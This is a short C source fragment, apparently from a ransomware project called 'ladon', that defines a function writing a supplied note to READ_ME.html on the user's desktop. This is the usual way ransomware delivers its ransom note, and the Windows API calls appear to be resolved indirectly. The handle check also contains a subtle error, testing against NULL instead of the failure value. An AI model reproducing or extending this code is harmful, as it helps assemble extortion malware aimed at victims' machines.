#include "ladon.h"

BOOL DropNoteDesktop(LPCSTR note) {
	wchar_t desk[MAX_PATH];
	wchar_t fullnote[MAX_PATH];
	_SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desk);
	_wsprintfW(fullnote, L"%s%s", desk, L"\\READ_ME.html");

	HANDLE file = _CreateFileW(fullnote, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD useless = 0;
	if (file) {
		_WriteFile(file, note, _lstrlen(note) + 1, &useless, 0);
		_CloseHandle(file);
	}
	return TRUE;
}
